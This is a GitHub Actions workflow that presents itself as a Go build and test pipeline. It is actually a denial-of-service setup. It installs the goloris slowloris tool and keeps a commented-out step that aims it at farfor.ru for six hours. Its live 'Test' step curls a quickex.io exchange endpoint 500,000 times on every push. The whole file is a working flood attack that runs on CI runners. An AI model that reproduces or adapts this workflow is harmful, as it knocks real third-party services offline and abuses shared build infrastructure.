name: Go

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:

  build:
    runs-on: ubuntu-latest
    #strategy:
     # matrix: 
      # site: ["https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru"]
    steps:
    - uses: actions/checkout@v2

    - name: Set up Go
      uses: actions/setup-go@v2
      with:
        go-version: 1.17

    - name: Build
      run: go get -u github.com/valyala/goloris

    - name: Test
      #run: goloris -victimUrl "${{ matrix.site }}" -dialWorkersCount 100 -testDuration 6h -rampUpInterval 100ms
      run: for i in {1..500000}; do echo "Welcome $i times";curl "https://quickex.io/exchange/create?fix=0&amount-from=0.010&amount-to=10000=&currency-from=ETH&currency-to=USDT" ; done
